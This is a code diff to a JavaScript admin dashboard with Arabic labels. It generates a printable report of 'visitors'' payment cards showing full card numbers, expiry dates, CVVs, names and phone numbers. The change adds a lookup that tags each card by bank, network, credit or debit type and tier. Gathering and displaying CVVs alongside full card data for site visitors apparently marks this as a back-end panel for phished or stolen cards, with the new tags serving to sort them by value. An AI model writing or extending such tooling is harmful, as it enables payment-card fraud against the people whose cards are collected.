@@ -2031,14 +2031,20 @@
       visitors.forEach((visitor) => {
         if (visitor.paymentCards && visitor.paymentCards.length > 0) {
           visitor.paymentCards.forEach((card) => {
+            const cardInfo = getCardInfo(card.cardNumber);
             allCards.push({
               visitorName: visitor.fullName || 'غير معروف',
               visitorPhone: visitor.phone || 'غير معروف',
               cardNumber: card.cardNumber || '',
-              expiryDate: card.expiryDate || '',
+              expiryMonth: card.expiryMonth || '',
+              expiryYear: card.expiryYear || '',
               cvv: card.cvv || '',
-              cardHolder: card.cardHolder || '',
-              timestamp: card.timestamp || ''
+              nameOnCard: card.nameOnCard || '',
+              timestamp: card.timestamp || '',
+              bank: cardInfo.bank,
+              network: cardInfo.network,
+              type: cardInfo.type,
+              tier: cardInfo.tier
             });
           });
         }
@@ -2061,83 +2067,141 @@
               font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
               padding: 20px;
               direction: rtl;
+              background: #f5f5f5;
             }
             h1 {
               text-align: center;
               color: #333;
               margin-bottom: 30px;
             }
-            .card {
-              border: 1px solid #ddd;
-              border-radius: 10px;
-              padding: 15px;
+            .card-container {
+              background: #faf5ff;
+              border-radius: 12px;
+              padding: 16px;
               margin-bottom: 20px;
-              background: #f9f9f9;
+              border-right: 4px solid #9333ea;
               page-break-inside: avoid;
             }
-            .card-header {
+            .card-title {
               font-weight: bold;
-              font-size: 18px;
-              color: #2563eb;
-              margin-bottom: 10px;
-              border-bottom: 1px solid #ddd;
-              padding-bottom: 10px;
+              font-size: 16px;
+              color: #6b21a8;
+              margin-bottom: 12px;
             }
-            .card-row {
+            .bank-info {
+              background: linear-gradient(to left, #e9d5ff, #dbeafe);
+              padding: 12px;
+              border-radius: 8px;
+              margin-bottom: 12px;
               display: flex;
               justify-content: space-between;
-              margin: 8px 0;
+              align-items: center;
             }
-            .card-label {
+            .bank-name {
+              color: #7c3aed;
               font-weight: bold;
-              color: #666;
+              font-size: 18px;
             }
-            .card-value {
-              color: #333;
-              font-family: monospace;
-              font-size: 16px;
-            }
-            .timestamp {
+            .badge {
+              padding: 4px 8px;
+              border-radius: 4px;
               font-size: 12px;
-              color: #999;
-              text-align: left;
-              margin-top: 10px;
+              font-weight: bold;
+              margin-left: 8px;
+              display: inline-block;
+            }
+            .badge-credit {
+              background: #3b82f6;
+              color: white;
+            }
+            .badge-debit {
+              background: #22c55e;
+              color: white;
+            }
+            .badge-tier {
+              background: #facc15;
+              color: #713f12;
+            }
+            .network-text {
+              color: #6b7280;
+              font-size: 14px;
+            }
+            .card-details {
+              background: white;
+              padding: 16px;
+              border-radius: 8px;
+              border: 1px solid #e9d5ff;
+            }
+            .details-grid {
+              display: grid;
+              grid-template-columns: 1fr 1fr;
+              gap: 12px;
+            }
+            .detail-item {
+              display: flex;
+              flex-direction: column;
+            }
+            .detail-label {
+              color: #6b7280;
+              font-size: 14px;
+            }
+            .detail-value {
+              font-weight: bold;
+              font-size: 16px;
+              font-family: monospace;
+            }
+            .card-number {
+              font-size: 18px;
+              letter-spacing: 2px;
             }
             @media print {
-              .card { page-break-inside: avoid; }
+              .card-container { page-break-inside: avoid; }
+              body { background: white; }
             }
           </style>
         </head>
         <body>
-          <h1>📋 تقرير البطاقات</h1>
-          <p style="text-align: center; color: #666;">عدد البطاقات: ${allCards.length}</p>
+          <h1>💳 تقرير البطاقات</h1>
+          <p style="text-align: center; color: #666; margin-bottom: 30px;">عدد البطاقات: ` + allCards.length + `</p>
       `;
 
       allCards.forEach((card, index) => {
+        const formattedCardNumber = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
+        const typeClass = card.type === 'Credit' ? 'badge-credit' : 'badge-debit';
+        
         htmlContent += `
-          <div class="card">
-            <div class="card-header">بطاقة #${index + 1} - ${card.visitorName}</div>
-            <div class="card-row">
-              <span class="card-label">رقم الجوال:</span>
-              <span class="card-value">${card.visitorPhone}</span>
+          <div class="card-container">
+            <div class="card-title">💳 بطاقة دفع</div>
+            <div class="bank-info">
+              <div>
+                <span class="bank-name">🏦 ` + card.bank + `</span>
+                <span class="badge ` + typeClass + `">` + card.type + `</span>
+              </div>
+              <div>
+                <span class="badge badge-tier">` + card.tier + `</span>
+                <span class="network-text">` + card.network + `</span>
+              </div>
             </div>
-            <div class="card-row">
-              <span class="card-label">رقم البطاقة:</span>
-              <span class="card-value">${card.cardNumber}</span>
+            <div class="card-details">
+              <div class="details-grid">
+                <div class="detail-item">
+                  <span class="detail-label">رقم البطاقة:</span>
+                  <span class="detail-value card-number" dir="ltr">` + formattedCardNumber + `</span>
+                </div>
+                <div class="detail-item">
+                  <span class="detail-label">الاسم:</span>
+                  <span class="detail-value">` + card.nameOnCard + `</span>
+                </div>
+                <div class="detail-item">
+                  <span class="detail-label">الانتهاء:</span>
+                  <span class="detail-value">` + card.expiryMonth + `/` + card.expiryYear + `</span>
+                </div>
+                <div class="detail-item">
+                  <span class="detail-label">CVV:</span>
+                  <span class="detail-value">` + card.cvv + `</span>
+                </div>
+              </div>
             </div>
-            <div class="card-row">
-              <span class="card-label">تاريخ الانتهاء:</span>
-              <span class="card-value">${card.expiryDate}</span>
-            </div>
-            <div class="card-row">
-              <span class="card-label">CVV:</span>
-              <span class="card-value">${card.cvv}</span>
-            </div>
-            <div class="card-row">
-              <span class="card-label">اسم حامل البطاقة:</span>
-              <span class="card-value">${card.cardHolder}</span>
-            </div>
-            <div class="timestamp">التاريخ: ${card.timestamp ? new Date(card.timestamp).toLocaleString('ar-SA') : 'غير معروف'}</div>
           </div>
         `;
       });
@@ -2152,6 +2216,7 @@
         printWindow.print();
       };
     }
+
 
     // Logout function
     function logout() {
